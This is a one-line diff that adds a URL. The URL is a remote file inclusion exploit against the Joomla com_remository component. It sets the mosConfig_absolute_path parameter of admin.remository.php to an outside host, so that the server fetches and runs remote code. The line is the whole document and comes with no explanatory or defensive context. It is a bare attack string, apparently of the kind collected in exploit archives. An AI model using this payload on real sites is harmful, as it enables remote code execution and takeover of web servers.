@@ -1,0 +1,1 @@
+http://www.example.com/[joomlapath]/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=http://www.example.com?
